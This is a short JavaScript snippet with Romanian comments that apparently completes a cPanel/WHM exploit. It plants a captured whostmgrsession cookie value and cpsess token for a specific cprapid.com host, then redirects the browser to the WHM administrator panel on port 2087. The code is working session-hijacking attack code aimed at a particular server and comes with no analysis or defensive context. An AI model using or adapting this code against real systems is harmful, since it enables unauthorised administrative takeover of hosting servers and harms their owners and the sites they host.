// Datele obținute din rularea exploit-ului
const session_base = ":WNo_bzwPmV9r8IZ7";
const token = "/cpsess3901948497";

// Codifică session_base pentru a fi folosit ca valoare cookie
const cookieValue = encodeURIComponent(session_base);

// Setează cookie-ul whostmgrsession pentru domeniul curent
document.cookie = `whostmgrsession=${cookieValue}; path=/; domain=81-181-198-106.cprapid.com; secure;`;

// Redirecționează către URL-ul WHM cu token-ul corect
const whmUrl = `https://81-181-198-106.cprapid.com:2087${token}/`;
window.location.href = whmUrl;
